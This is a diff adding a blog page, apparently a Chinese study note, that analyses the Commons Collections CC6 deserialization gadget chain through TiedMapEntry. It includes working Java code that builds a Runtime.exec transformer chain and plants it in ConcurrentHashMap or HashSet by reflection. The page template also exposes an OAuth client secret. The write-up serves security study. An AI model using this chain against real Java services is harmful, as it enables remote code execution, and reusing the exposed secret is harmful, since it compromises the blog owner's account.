@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      [CC链反序列化学习]TiedMapEntry利用链 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>[CC链反序列化学习]TiedMapEntry利用链</h2>
+  <p class="post-date">2020-06-09 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h1><p>IDea debug 环境做个配置，要不会跑飞很迷</p>
+<p><img src="./image-20200608172013246.png" alt="image-20200608172013246"></p>
+<h1 id="TiedMapEntry-hashcode"><a href="#TiedMapEntry-hashcode" class="headerlink" title="TiedMapEntry.hashcode"></a>TiedMapEntry.hashcode</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntryExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String[].class &#125;,new Object[]&#123;new String[]&#123;</span><br><span class="line">                        <span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"open /System/Applications/Calculator.app"</span></span><br><span class="line">                &#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer tchain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(normalMap,tchain);</span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="keyword">null</span>);</span><br><span class="line">        tme.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cc6前半段利用LazyMap.get调用Transform方法触发反序列化。后半段利用TiedMapEntry.hashCode()调用getValue方法</p>
+<p><img src="./image-20200608172330455.png" alt="image-20200608172330455"></p>
+<p>为什么这里key可以是null或者任意值,</p>
+<p>i=0调用需要返回<code>Runtime.class</code>,</p>
+<p><img src="./image-20200608174956793.png" alt="image-20200608174956793"></p>
+<p>这里利用了new ConstantTransformer(Runtime.class)直接在调用transform返回iConstant,该值在实例化ConstantTransformer就进行了赋值，<em>所以当i=0与Object值无关及与key值无关</em>。</p>
+<p><img src="./image-20200608175118524.png" alt="image-20200608175118524"></p>
+<h1 id="ConcurrenHashMap跳板构造"><a href="#ConcurrenHashMap跳板构造" class="headerlink" title="ConcurrenHashMap跳板构造"></a>ConcurrenHashMap跳板构造</h1><p>现在需要找到跳板，该跳板必须重写了readObject方法，且最后能够执行TiedEntryExec.hashCode()</p>
+<p>简化调用栈如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">  ConcurrentHashMap.readObject</span><br><span class="line">    TiedMapEntry.hashCode   <span class="comment">// 此处开始TiedMapEntry利用链</span></span><br><span class="line">      TiedMapEntry.getValue</span><br><span class="line">        LazyMap.get         <span class="comment">// 此处开始LazyMap利用链</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进java.util.concurrent.ConcurrentHashMap.readObject()，在第1447调用hashCode，这里需要构造k为TiedMapEntry，才能触发利用链.</p>
+<p><img src="./image-20200609004555963.png" alt="image-20200609004555963"></p>
+<p>K、V值由Node存储，发现putVal方法中实现对类参数table的赋值，可以通过反射构造K、V值。注意这里K不能直接构造为TiedMapEntry，会直接调用LazyMap.get()</p>
+<p><img src="./image-20200609143104948.png" alt="image-20200609143104948"></p>
+<p>ConcurrenHashMap构造如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentHashMap chm = <span class="keyword">new</span> ConcurrentHashMap(<span class="number">1</span>);</span><br><span class="line">        chm.put(<span class="string">"key"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Field f = ConcurrentHashMap.class.getDeclaredField("table");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">				<span class="comment">//反射获取ConcurrentHashMap.table参数，反射设置key值为tme</span></span><br><span class="line">        Object[] table = (Object[])f.get(chm);</span><br><span class="line">        Object node = table[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Field k = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        k.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        k.set(node,tme);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="HashSet跳板构造"><a href="#HashSet跳板构造" class="headerlink" title="HashSet跳板构造"></a>HashSet跳板构造</h1><p>跟进HashSet.readObject，put方法只要控制e参数和map参数，就能调用TideMapEntry.HashCode()</p>
+<p><img src="./image-20200609152733244.png" alt="image-20200609152733244"></p>
+<p>实际构造和ConcurrenHashMap类似，只不过这里需要对map值进行反射设置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//直接add(tme)会执行TiedMapEntry.hashcode</span></span><br><span class="line"><span class="comment">//这里占个位,通过反射修改key</span></span><br><span class="line">hashSet.add(<span class="string">"anything"</span>);</span><br><span class="line">Field setMap = hashSet.getClass().getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">setMap.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashMap = (HashMap) setMap.get(hashSet);</span><br><span class="line">Field setTable = hashMap.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">setTable.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] table = (Object[]) setTable.get(hashMap);</span><br><span class="line">Object Node = table[<span class="number">1</span>];</span><br><span class="line">Field setKey = Node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">setKey.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">setKey.set(Node,tme);</span><br></pre></td></tr></table></figure>
+
+<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashSet.readObject()</span><br><span class="line">               java.util.HashMap.put()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/190468#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190468#h3-8</a></p>
+<p><a href="http://scz.617.cn:8/network/202003241127.txt" target="_blank" rel="noopener">http://scz.617.cn:8/network/202003241127.txt</a></p>
+<p><a href="https://www.iteye.com/blog/bluepopopo-486548" target="_blank" rel="noopener">https://www.iteye.com/blog/bluepopopo-486548</a></p>
+<p><a href="https://xz.aliyun.com/t/7029" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#JAVA反序列化" >
+    <span class="tag-code">JAVA反序列化</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/06/02/CTF-2020RCTF-Swoole%E9%A2%98%E8%A7%A3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        <span class="nav-arrow">← </span>
+        
+          [CTF]2020RCTF Swoole题解学习笔记
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#DEBUG"><span class="toc-nav-text">DEBUG</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#TiedMapEntry-hashcode"><span class="toc-nav-text">TiedMapEntry.hashcode</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ConcurrenHashMap跳板构造"><span class="toc-nav-text">ConcurrenHashMap跳板构造</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HashSet跳板构造"><span class="toc-nav-text">HashSet跳板构造</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#调用栈"><span class="toc-nav-text">调用栈</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2020/06/09/CC链反序列化学习-TiedMapEntry利用链/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "[CC链反序列化学习]TiedMapEntry利用链",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
